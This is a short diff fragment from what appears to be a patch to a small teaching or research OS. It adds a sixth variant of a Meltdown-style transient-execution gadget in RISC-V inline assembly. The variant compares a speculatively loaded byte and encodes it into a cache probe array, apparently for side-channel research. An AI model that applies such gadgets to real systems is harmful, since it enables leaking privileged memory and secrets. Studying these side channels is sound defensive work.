@@ -861,8 +861,8 @@ diff -ruN minios/user/init.c minios/user/init.c
  
 diff -ruN minios/user/meltdown_us.c minios/user/meltdown_us.c
 --- minios/user/meltdown_us.c	1970-01-01 08:00:00.000000000 +0800
-+++ minios/user/meltdown_us.c	2026-07-09 05:52:12.113093995 +0800
-@@ -0,0 +1,549 @@
++++ minios/user/meltdown_us.c	2026-07-09 06:02:33.775227752 +0800
+@@ -0,0 +1,557 @@
 +#include "user.h"
 +
 +#ifndef MELTDOWN_US_PROBE_STRIDE
@@ -1164,8 +1164,16 @@ diff -ruN minios/user/meltdown_us.c minios/user/meltdown_us.c
 +        "add  t0, t0, %3\n"
 +        "ld   t0, 0(t0)\n"
 +        "lb   t1, 0(t0)\n"
++#elif MELTDOWN_US_GADGET_VARIANT == 6
++        "lbu  t0, 0(%0)\n"
++        "li   t2, 0x53\n"
++        "bne  t0, t2, 1f\n"
++        "slli t2, t2, %2\n"
++        "add  t2, t2, %1\n"
++        "lb   t1, 0(t2)\n"
++        "1:\n"
 +#else
-+#error "MELTDOWN_US_GADGET_VARIANT must be 0, 1, 2, 3, 4, or 5"
++#error "MELTDOWN_US_GADGET_VARIANT must be 0, 1, 2, 3, 4, 5, or 6"
 +#endif
 +        "meltdown_us_recover_label:\n"
 +        "nop\n"
